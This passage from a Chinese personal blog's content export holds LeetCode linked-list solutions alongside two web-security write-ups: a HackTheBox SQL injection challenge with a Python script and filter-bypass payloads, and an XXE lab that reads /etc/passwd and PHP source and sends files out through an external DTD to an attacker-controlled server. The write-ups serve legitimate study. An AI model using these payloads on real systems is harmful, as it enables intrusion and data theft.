class="number">1</span>; i &lt; list.size(); i++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (list.get(i) &lt; minValue) &#123;</span><br><span class="line">                        minValue = list.get(i);</span><br><span class="line">                        minIndex = i;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">int</span> secondMinValue;</span><br><span class="line">                <span class="keyword">if</span> (minIndex != <span class="number">0</span>) &#123;</span><br><span class="line">                    secondMinValue = list.get(<span class="number">0</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    secondMinValue = list.get(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; list.size(); i++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i != minIndex &amp;&amp; list.get(i) &lt; secondMinValue) &#123;</span><br><span class="line">                        secondMinValue = list.get(i);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> (minValue + secondMinValue) / <span class="number">2.0</span>;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200524154401166.png" alt="image-20200524154401166"></p>
<p>总结:这道题一定要考虑细节处理，以及很多特殊用例。</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode142_环形链表_II</title>
    <url>/%E7%AE%97%E6%B3%95/Leetcode142-%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8-II/</url>
    <content><![CDATA[<p>题目说明：</p>
<p>给定一个链表，返回链表开始入环的第一个节点。 如果链表无环，则返回 null。</p>
<p>为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。</p>
<p>说明：不允许修改给定的链表。</p>
<p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/linked-list-cycle-ii" target="_blank" rel="noopener">https://leetcode-cn.com/problems/linked-list-cycle-ii</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p>
<a id="more"></a>



<h2><span id="方式一使用额外空间判断是否遍历过">方式一，使用额外空间判断是否遍历过。</span></h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">detectCycle1</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">       ListNode node = head;</span><br><span class="line">       HashSet&lt;ListNode&gt; visitedSet = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">       <span class="keyword">while</span>(node != <span class="keyword">null</span>)&#123;</span><br><span class="line">           <span class="keyword">if</span>(visitedSet.contains(node))&#123;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               visitedSet.add(node);</span><br><span class="line">           &#125;</span><br><span class="line">           node = node.next;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> node;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<h2><span id="方法二快慢指针法">方法二，快慢指针法</span></h2><p>慢指针：每次走一步</p>
<p>快指针：每次走两步</p>
<p>如果快慢指针相遇且任意一个指针不为null则一定存在环。</p>
<p>首结点索引0，环起点索引b，环终点索引e，相遇点索引m，环长（e-b+1）.</p>
<p><img src="/assets/image-20200523203221526.png" alt="image-20200523203221526"></p>
<p>相遇时间为t</p>
<p>$$ 2t=b-1+(m-b+1)+(e-b+1)*k1$$    k1圈</p>
<p>$$ t=b-1+(m-b+1)+(e-b+1)*k2 $$     k2圈</p>
<p>简化:</p>
<p>$$ 2t=m+(e-b+1)*k1$$</p>
<p>$$ t= m+(e-b+1)*k2$$</p>
<p>再简化：</p>
<p>$$ t=(e-b+1)*(k1-k2) $$</p>
<p>只知道t，目标是求b。方程组是求不出来的。</p>
<p>现在证明一个问题，k2=0。相当于证明$$t&lt;e$$</p>
<p>经过问题分析，总结结论：</p>
<p><font color="orange">结论一 、如果快指针在慢指针后面，快指针想超过慢指针，它们必须会相遇。</font></p>
<p>证明：</p>
<p>（1）如果快指针比慢指针慢1步。下1s慢指针走1步，快指针走2步，快慢相遇。</p>
<p>（2）如果快指针比慢指针慢2步，下1s慢指针走1步，快指针走2步，快指针比慢指针慢1。问题转化为（1）</p>
<p>（3）其他问题都可以归纳为问题（1）和问题（2），即归纳为问题（1）</p>
<p>所以一定会相遇。</p>
<p><font color="orange">结论二、慢指针第一次到达环尾必定和快指针相遇至少一次。</font></p>
<p>反证法:<font color="red">假设慢指针第一次到达环尾都没有和快指针相遇过。</font></p>
<p>慢指针到达环尾走了e步。此时快指针走了2e步。</p>
<p>慢指针走了b步，就在环头了。此时快指针走了2b步，且肯定在环上。</p>
<p>此时分为两种情况：</p>
<p>（1）快指针和慢指针都在环头。此时快慢指针相遇，与假设矛盾。</p>
<p>（2）快指针不在环头，假设快指针此时在索引k点。接下来慢指针走（e-b）步到达e点，此时快指针亦走了2（e-b）步。而环的总长度为（e-b）。快指针在环上走了两圈，快指针在环上走了一圈，肯定存在快指针超过慢指针情况。根据结论一，快慢指针必定会相遇，与假设矛盾。</p>
<p>所以慢指针第一次到达环尾必定和快指针相遇至少一次。</p>
<p>所以问题可以简化为：</p>
<p>$$t=m$$</p>
<p>$$ 2t=m+(e-b+1)*k1 $$</p>
<p>即$$t=m=(e-b+1)*k1$$</p>
<p>现在慢指针走(e-m+1)+(e-b+1)*k步可以到达入口点，其中k为任意常数，代表圈数。</p>
<p>如果同时有个慢指针（每次只走一步）从链头出发，走b步可以到达环头。</p>
<p><font color="orange">如果在快慢指针相遇时，有一个慢指针s2从链头参加走动，则当这个慢指针第一次到达环头时会和另一个慢指针s1相遇</font></p>
<p>慢指针s2到达环头时走了b步,此时s2也走了b步。</p>
<p>由下面分析发现此时s2也在环头，且走路（k1-1）圈。</p>
<p><img src="/assets/image-20200524001721432.png" alt="image-20200524001721432"></p>
<p>因此代码就很简单了。s1和s2第一次相遇点即为环头。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">detectCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode slow1Pointer = head;</span><br><span class="line">        ListNode quickPointer = head;</span><br><span class="line">        <span class="keyword">int</span> t = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            slow1Pointer = slow1Pointer.next;</span><br><span class="line">            ListNode tmpQuickPointer = quickPointer.next;</span><br><span class="line">            <span class="keyword">if</span> (tmpQuickPointer == <span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            quickPointer = tmpQuickPointer.next;</span><br><span class="line">            <span class="keyword">if</span>(quickPointer == <span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            t++;</span><br><span class="line">        &#125;<span class="keyword">while</span> (slow1Pointer != quickPointer);</span><br><span class="line">        ListNode slow2Pointer = head;</span><br><span class="line">        <span class="keyword">while</span>(slow1Pointer != slow2Pointer)&#123;</span><br><span class="line">            slow2Pointer = slow2Pointer.next;</span><br><span class="line">            slow1Pointer = slow1Pointer.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slow1Pointer;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>效率：</p>
<p><img src="/assets/image-20200524002314952.png" alt="image-20200524002314952"></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title>hackthebox_expz</title>
    <url>/web/hackthebox-expz/</url>
    <content><![CDATA[<p>本文主要讲解hackthebox上的20分挑战ezpz</p>
<a id="more"></a>

<p>(1)创建实例</p>
<p>创建示例，然后进入发现是个网站：</p>
<p><img src="/assets/image-20200513220512964.png" alt="image-20200513220512964"></p>
<p>需要参数obj，随便输入obj参数，发现ID属性还是没有。</p>
<p>（2）扫描</p>
<p>用dirb扫描网站：</p>
<p><img src="/assets/image-20200513220834140.png" alt="image-20200513220834140"></p>
<p>打开所有文件，发现都是一样的。</p>
<p>（3）漏洞挖掘</p>
<p>既然只有一个文件，那思路就在这个文件。发现源码中最下面（<font color="red">特别隐蔽的点</font>）有个提示</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Hint : base64_encode($data)--&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后obj有个属性ID,所以添加参数后encode。</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">obj</span>=&#123;<span class="string">"ID"</span>:<span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure>

<p>encode后：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">obj</span>=eyJJRCI6MX0=</span><br></pre></td></tr></table></figure>

<p>成功:</p>
<p><img src="/assets/image-20200513222409658.png" alt="image-20200513222409658"></p>
<p>所以可以在ID处看下有注入没有。</p>
<p>由于手工测试比较麻烦，所以写脚本测试：</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import <span class="built_in">base64</span></span><br><span class="line">url=<span class="string">"http://docker.hackthebox.eu:31417/?obj="</span></span><br><span class="line">def send(ID):</span><br><span class="line">	param = '&#123;<span class="string">"ID"</span>:<span class="string">"%s"</span>&#125;'%ID</span><br><span class="line">	param = <span class="built_in">base64</span>.b64encode(param.encode()).decode()</span><br><span class="line">	cur_url = url+param</span><br><span class="line">	<span class="built_in">print</span>(cur_url)</span><br><span class="line">	<span class="built_in">content</span> = requests.<span class="built_in">get</span>(cur_url).<span class="built_in">content</span>.decode('utf-<span class="number">8</span>')</span><br><span class="line">	<span class="keyword">if</span>(len(<span class="built_in">content</span>) != <span class="number">393</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="built_in">content</span>)</span><br></pre></td></tr></table></figure>



<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"1#"</span>)</span></span>  正确</span><br><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"1' and 1#"</span>)</span></span> 正确</span><br><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"1' order by 1 #"</span>)</span></span>  <span class="attribute">order</span> 被拦截了</span><br><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"1' union select 1 #"</span>)</span></span> 正确</span><br><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"1' union select 1,2 #"</span>)</span></span> block了，猜想是block了，</span><br><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"1', #"</span>)</span></span> block，确实block了逗号</span><br></pre></td></tr></table></figure>

<p>由于过滤了逗号，所以在网上找过滤逗号思路，找到了一种：</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">select</span> * <span class="title">from</span> ((<span class="title">select</span> 1)<span class="title">A</span> <span class="title">join</span> (<span class="title">select</span> 2)<span class="title">B</span> <span class="title">join</span> (<span class="title">select</span> 3)<span class="title">C</span>）;</span></span><br></pre></td></tr></table></figure>

<p>继续注入：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"1' union select * from ((select 1)A join (select 2)B) #"</span>)</span></span>  成功</span><br><span class="line">测试回显位：</span><br><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"-1' union select * from ((select 1)A join (select 2)B) #"</span>)</span></span> 发现显示<span class="number">2</span>，证明第<span class="number">2</span>位为回显位。</span><br><span class="line">接下来测试哪些关键词被过滤了：</span><br><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"information_schema.tables"</span>)</span></span> blcok了，经尝试有schema.tables关键词则会报错。</span><br><span class="line">然而数据库和表名都可以加`</span><br><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"`schema`.`tables`"</span>)</span></span> 成功，成功绕过。</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"where table_schema=database()"</span>)</span></span>  block了，经测试是where被block了。</span><br><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"group_concat(table_name)"</span>)</span></span> group_concat被block了</span><br></pre></td></tr></table></figure>

<p>尝试：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">send("-1' union <span class="keyword">select</span> * <span class="keyword">from</span> ((<span class="keyword">select</span> <span class="number">1</span>)A <span class="keyword">join</span> (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.<span class="symbol">`tables`</span>)B) #<span class="string">")</span></span><br></pre></td></tr></table></figure>



<p>访问:</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//docker.hackthebox.eu:31417/?obj=eyJJRCI6Ii0xJyB1bmlvbiBzZWxlY3QgKiBmcm9tICgoc2VsZWN0IDEpQSBqb2luIChzZWxlY3QgdGFibGVfbmFtZSBmcm9tIGBpbmZvcm1hdGlvbl9zY2hlbWFgLmB0YWJsZXNgKUIpICMifQ==</span></span><br></pre></td></tr></table></figure>

<p>得到表：</p>
<p><img src="/assets/image-20200513234046121.png" alt="image-20200513234046121"></p>
<p>仔细观察发现可疑表：FlagTableUnguessableEzPZ</p>
<p>直接select 尝试：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">send("-1' union <span class="keyword">select</span> * <span class="keyword">from</span> ((<span class="keyword">select</span> <span class="number">1</span>)A <span class="keyword">join</span> (<span class="keyword">select</span> * <span class="keyword">from</span> FlagTableUnguessableEzPZ)B) <span class="comment">#")</span></span><br></pre></td></tr></table></figure>

<p>运气好，只有一个字段，显示出flag:</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">HTB&#123;T<span class="number">0</span>oE<span class="number">4</span>syP<span class="number">34</span>syL<span class="number">4</span><span class="name">m3</span>SQLiF!<span class="keyword">lt</span><span class="number">3</span>rs&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>hack_the_box</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE漏洞实验</title>
    <url>/web/XXE%E6%BC%8F%E6%B4%9E%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<center><font size="7">XXE漏洞实验</font></center>
本文主要为XXE漏洞实战。

<a id="more"></a>

<h1><span id="靶场实验">靶场实验</span></h1><h2><span id="有回显xxe">有回显XXE</span></h2><p>代码审计看一下js代码（test1.js）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doLogin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> username = $(<span class="string">"#username"</span>).val();</span><br><span class="line">	<span class="keyword">var</span> password = $(<span class="string">"#password"</span>).val();</span><br><span class="line">	<span class="keyword">if</span>(username == <span class="string">""</span> || password == <span class="string">""</span>)&#123;</span><br><span class="line">		alert(<span class="string">"Please enter the username and password!"</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">var</span> data = <span class="string">"&lt;user&gt;&lt;username&gt;"</span> + username + <span class="string">"&lt;/username&gt;&lt;password&gt;"</span> + password + <span class="string">"&lt;/password&gt;&lt;/user&gt;"</span>; </span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">"POST"</span>,</span><br><span class="line">        url: <span class="string">"doLogin1.php"</span>,</span><br><span class="line">        contentType: <span class="string">"application/xml;charset=utf-8"</span>,</span><br><span class="line">        data: data,</span><br><span class="line">        dataType: <span class="string">"xml"</span>,</span><br><span class="line">        anysc: <span class="literal">false</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">        	<span class="keyword">var</span> code = result.getElementsByTagName(<span class="string">"code"</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue;</span><br><span class="line">        	<span class="keyword">var</span> msg = username;</span><br><span class="line"></span><br><span class="line">        	<span class="keyword">if</span>(code == <span class="string">"0"</span>)&#123;</span><br><span class="line">        		$(<span class="string">".msg"</span>).text(msg + <span class="string">" login fail!"</span>);</span><br><span class="line">        	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(code == <span class="string">"1"</span>)&#123;</span><br><span class="line">        		$(<span class="string">".msg"</span>).text(msg + <span class="string">" login success!"</span>);</span><br><span class="line">        		alert(<span class="string">"login success!"</span>);</span><br><span class="line">        	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        		$(<span class="string">".msg"</span>).text(<span class="string">"error:"</span> + msg);</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        error: <span class="function"><span class="keyword">function</span> (<span class="params">XMLHttpRequest,textStatus,errorThrown</span>) </span>&#123;</span><br><span class="line">            $(<span class="string">".msg"</span>).text(errorThrown + <span class="string">':'</span> + textStatus);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>是一个ajax请求，传入的是xml，所以可以使用xxe。</p>
<p>而且在源码审计中发现口令在：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/tmp/</span>password.txt</span><br></pre></td></tr></table></figure>

<p>所以XXE读这个文件即可。</p>
<p>在登录框输入账户名：admin,密码:123.</p>
<p>抓到包：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/vulnlab/xxe/doLogin1.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 47.105.75.177</span><br><span class="line"><span class="attribute">Content-Length</span>: 63</span><br><span class="line"><span class="attribute">Accept</span>: application/xml, text/xml, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span>: XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span>: application/xml;charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span>: http://47.105.75.177</span><br><span class="line"><span class="attribute">Referer</span>: http://47.105.75.177/vulnlab/xxe/index1.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span>: BkGOp9578O_think_template=default; UM_distinctid=171e9e4df09110-01bb29db0210e5-c373667-1fa400-171e9e4df0a352; CNZZDATA1257137=cnzz_eid%3D1631752570-1588767023-http%253A%252F%252F47.105.75.177%252F%26ntime%3D1588864880; CNZZDATA3801251=cnzz_eid%3D1725538590-1588767023-http%253A%252F%252F47.105.75.177%252F%26ntime%3D1589014034; DedeUserID=15; DedeUserID__ckMd5=b150f3b13efab666; DedeLoginTime=1589018256; DedeLoginTime__ckMd5=47d5213a542b9f30</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&lt;user&gt;&lt;username&gt;admin&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>

<p>发现响应中包含admin，所以是带回显的XXE。把需要显示的值放在username里就可以了。</p>
<p>(1)读文件</p>
<p>XXE读文件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">gvi</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///tmp/password.txt"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>但发现读取不成功。</p>
<p>再尝试：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">user</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///tmp/password.txt"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>也不行。</p>
<p>尝试其他文件（/etc/passwd）：</p>
<p><img src="/assets/image-20200511131239868.png" alt="image-20200511131239868"></p>
<p>读取成功，看来那个文件可能不存在。</p>
<p>（2）读源码</p>
<p>使用php伪协议读取源码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">gvi</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=doLogin1.php"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$USERNAME = <span class="string">'heetianlab'</span>; <span class="comment">//è´¦å·</span></span><br><span class="line">$PASSWORD = <span class="string">'test009'</span>; <span class="comment">//å¯ç </span></span><br><span class="line">$result = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">	$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">	$creds = simplexml_import_dom($dom);</span><br><span class="line"></span><br><span class="line">	$username = $creds-&gt;username;</span><br><span class="line">	$password = $creds-&gt;password;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123;</span><br><span class="line">		$result1 = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="number">1</span>,$username);</span><br><span class="line">		$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;/result&gt;"</span>,<span class="number">1</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$result1 = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="number">0</span>,$username);</span><br><span class="line">		$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;/result&gt;"</span>,<span class="number">0</span>);</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">	$result1 = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="number">3</span>,$e-&gt;getMessage());</span><br><span class="line">	$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;/result&gt;"</span>,<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">'Content-Type: text/html; charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">echo</span> $result1;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到用户名：heetianlab，密码：test009</p>
<h2><span id="无回显xxe">无回显XXE</span></h2><p>同样的登录时候抓包，发现没回显了：</p>
<p><img src="/assets/image-20200511134218161-1589375488660.png" alt="image-20200511134218161"></p>
<p>这时候就要我们的远程服务器进行攻击了.</p>
<p>evil2.dtd:</p>
<figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=doLogin2.php"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://104.243.21.153:8998/%file;'&gt;"</span>&gt;</span></span></span><br><span class="line"><span class="perl">%all;</span></span><br></pre></td></tr></table></figure>



<p>构造请求包：</p>
<figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://104.243.21.153/xxe/evil2.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="perl">%dtd;</span></span><br><span class="line"><span class="perl">%int;</span></span><br><span class="line"><span class="perl">%send;</span></span><br><span class="line"><span class="xml">]&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200513210825588.png" alt="image-20200513210825588"></p>
<p>服务器端得到数据：</p>
<p><img src="/assets/image-20200513210432175.png" alt="image-20200513210432175"></p>
<p>即：</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">PD<span class="number">9</span>waHAKCgokVVNFUk<span class="number">5</span>BTUUgPSAnaGVldGlhbmxhYic<span class="number">7</span>IC<span class="number">8</span>v<span class="number">6</span>LSm<span class="number">5</span>Y+<span class="number">3</span>CiRQQVNTV<span class="number">09</span>SRCA<span class="number">9</span>ICd<span class="number">0</span>ZXN<span class="number">0</span>MDA<span class="number">5</span>JzsgLy/lr<span class="number">4</span>bnoIEKJHJlc<span class="number">3</span>VsdCA<span class="number">9</span>IG<span class="number">51</span>bGw<span class="number">7</span>CgpsaWJ<span class="number">4</span>bWxfZGlzYWJsZV<span class="number">9</span>lbnRpdHlfbG<span class="number">9</span>hZGVyKGZhbHNlKTsKJHhtbGZpbGUgPSBmaWxlX<span class="number">2</span>dldF<span class="number">9</span>jb<span class="number">250</span>ZW<span class="number">50</span>cygncGhwO<span class="keyword">i8</span>vaW<span class="number">5</span>wdXQnKTsKCnRyeXsKCSRkb<span class="number">20</span>gPSBuZXcgRE<span class="number">9</span>NRG<span class="number">9</span>jdW<span class="number">1</span>lbnQoKTsKCSRkb<span class="number">20</span>tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF<span class="number">9</span>OT<span class="number">0</span>VOVCB<span class="number">8</span>IExJQlhNTF<span class="number">9</span>EVERMT<span class="number">0</span>FEKTsKCSRjcmVkcyA<span class="number">9</span>IHNpbXBsZXhtbF<span class="number">9</span>pbXBvcnRfZG<span class="number">9</span>tKCRkb<span 